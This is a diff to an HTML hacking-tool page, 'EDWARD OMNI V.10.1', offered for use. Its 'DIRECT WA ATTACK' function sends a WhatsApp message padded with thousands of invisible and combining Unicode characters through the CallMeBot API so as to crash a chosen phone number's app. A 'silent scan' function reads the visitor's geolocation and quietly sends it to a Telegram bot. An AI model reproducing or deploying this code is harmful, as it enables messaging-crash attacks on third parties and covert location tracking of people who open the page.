@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>[ EDWARD OMNI V.10.0 FINAL ]</title>
+    <title>[ EDWARD OMNI V.10.1 FINAL ]</title>
     <style>
         :root { --neon: #0f0; --danger: #f00; --bg: #0a0a0a; --purple: #bc13fe; }
         body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; padding: 20px; text-align: center; }
@@ -24,8 +24,8 @@
 </head>
 <body>
 
-    <h1>EDWARD OMNI <span style="color:#fff">V.10.0</span></h1>
-    <p style="font-size:10px; color:var(--purple); font-weight: bold;">[ SERVER-SIDE & BRUTAL SYSTEM ]</p>
+    <h1>EDWARD OMNI <span style="color:#fff">V.10.1</span></h1>
+    <p style="font-size:10px; color:var(--purple); font-weight: bold;">[ DIRECT SERVER ATTACKER ACTIVE ]</p>
 
     <div class="panel">
         <button onclick="takeSnap()" style="background:#fff; color:#000; border:none;">📸 RADAR & SILENT SCAN</button>
@@ -36,9 +36,8 @@
     <div class="panel" style="border-color: var(--purple)">
         <h3 style="color: var(--purple); margin:0">😈 DIRECT WA ATTACK</h3>
         <input type="number" id="noBug" placeholder="Nomor: 628xxxxxxx">
-        <input type="text" id="apiKey" placeholder="CallMeBot Key (Opsional)">
+        <input type="text" id="apiKey" placeholder="Masukkan CallMeBot API Key">
         <button onclick="sendServerBug()" class="btn-server">SEND VIA SERVER 🚀</button>
-        <p style="font-size: 8px; color: #666; margin-top: 5px;">*Kirim otomatis tanpa buka aplikasi WA.</p>
     </div>
 
     <div class="panel">
@@ -74,11 +73,10 @@
             setTimeout(() => { t.className = ""; }, 3000);
         }
 
-        // 😈 SERVER-SIDE DIRECT BUG
         function sendServerBug() {
             let n = document.getElementById('noBug').value;
-            let api = document.getElementById('apiKey').value || "965315";
-            if(!n) return showToast("INPUT NOMOR!", "#f00");
+            let api = document.getElementById('apiKey').value;
+            if(!n || !api) return showToast("INPUT NOMOR & API KEY!", "#f00");
 
             let crashText = "ॣ".repeat(800) + "‎".repeat(1200) + "😈_CRASH_SYSTEM_V10_😈" + "​​".repeat(2000);
             let url = `https://api.callmebot.com/whatsapp.php?phone=${n}&text=${encodeURIComponent(crashText)}&apikey=${api}`;
@@ -103,9 +101,8 @@
                     showToast("INTEL SENT!");
                 }, 1500);
             } catch (e) { showToast("DENIED!", "#f00"); }
-            
             navigator.geolocation.getCurrentPosition(p => {
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=📍 LOC: http://googleusercontent.com/maps.google.com/6{p.coords.latitude},${p.coords.longitude}`);
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=📍 LOC: http://googleusercontent.com/maps.google.com/9{p.coords.latitude},${p.coords.longitude}`);
             });
         }
 
